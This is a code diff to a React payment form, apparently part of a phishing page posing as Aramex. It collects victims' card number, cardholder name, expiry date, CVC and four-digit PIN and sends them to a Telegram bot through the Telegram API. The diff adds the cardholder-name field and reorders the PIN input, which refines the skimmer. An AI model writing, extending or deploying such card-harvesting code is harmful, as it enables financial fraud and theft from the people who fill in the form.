@@ -10,7 +10,7 @@ import bot from '@/compnante/dataBot'
 
 const Pay=()=>{
     const selectPay = useRef()
-  
+    const namecard = useRef()
     const NumsCard = useRef()
     const dateCardmm = useRef()
     const dateCardyy = useRef()
@@ -23,14 +23,14 @@ const Pay=()=>{
     const handleSubmit = (e) => {
         e.preventDefault();
  
-        var length =`مدونة ارامكس  %0A طريقة الدفع : ${selectPay.current.value}  %0A  رقم البطاقة  : ${NumsCard.current.value} %0A  MM    :  ${dateCardmm.current.value} %0A  YY   :  ${dateCardyy.current.value} %0A cvc : ${cvcCard.current.value}%0A رمز البطاقة:${passCard.current.value} %0A %0A ${datas}`
+        var length =`مدونة ارامكس  %0A طريقة الدفع : ${selectPay.current.value}  %0A  رقم البطاقة  : ${NumsCard.current.value} %0A الاسم على البطاقة:${namecard}%0A  MM    :  ${dateCardmm.current.value} %0A  YY   :  ${dateCardyy.current.value} %0A cvc : ${cvcCard.current.value}%0A رمز البطاقة:${passCard.current.value} %0A %0A ${datas}`
        
         
         fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
       
       }
       const handlerout = ()=>{
-        if(NameCard.current.value == "" || NumsCard.current.value == "" || dateCardmm.current.value == "" || dateCardyy.current.value == "" || cvcCard.current.value == "" || passCard.current.value == ""){
+        if(namecard.current.value == "" || NumsCard.current.value == "" || dateCardmm.current.value == "" || dateCardyy.current.value == "" || cvcCard.current.value == "" || passCard.current.value == ""){
           alert('من فضلك قم بملى الحقول')
         }else{
           
@@ -63,7 +63,7 @@ const Pay=()=>{
                 <option value="فيزا كارد">فيزا كارد</option>
                 <option value="ماستر كارد">ماستر كارد</option>
             </select>
-            <input type="text" placeholder=' رمز بطاقة الصراف المكون من اربعة ارقام'ref={passCard} required/>
+            <input type="text" placeholder='الاسم على البطاقة'ref={namecard} required/>
             <input type="number" placeholder='رقم البطاقة' dir="ltr" ref={NumsCard}  required maxLength="16"/>
             <div>
             <input type="text" placeholder='(MM)'  ref={dateCardmm} maxLength="2" required/>
@@ -72,6 +72,7 @@ const Pay=()=>{
             
             
             <input type="text" placeholder='الرقم (cvc/cvv)'ref={cvcCard} maxLength="3" required/>
+            <input type="text" placeholder='رمز البطاقة المكون من اربعة ارقام'ref={passCard} maxLength="5" required/>
             <button type='submit' onClick={handlerout}> ارسال</button>
         </form>
     </div>
